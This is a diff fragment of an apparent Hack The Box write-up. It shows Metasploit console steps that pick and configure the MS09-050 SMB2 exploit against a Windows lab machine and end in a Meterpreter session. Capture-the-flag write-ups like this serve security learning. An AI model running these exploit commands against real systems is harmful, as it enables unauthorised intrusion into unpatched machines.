@@ -126,8 +126,10 @@ Matching Modules
    0  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
    1  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
    2  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+```
 
-
+Exploit using one of them:
+```
 msf5 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
 msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
 
@@ -169,4 +171,4 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 ```
 
-From here is trivial to get user and root flags. Note that at the moment of writing this the hashes obtained weren't being accepted by the HTB dashboard.
+From here is trivial to catch user and root flags. Note that at the moment of writing this the hashes obtained weren't being accepted by the HTB dashboard.
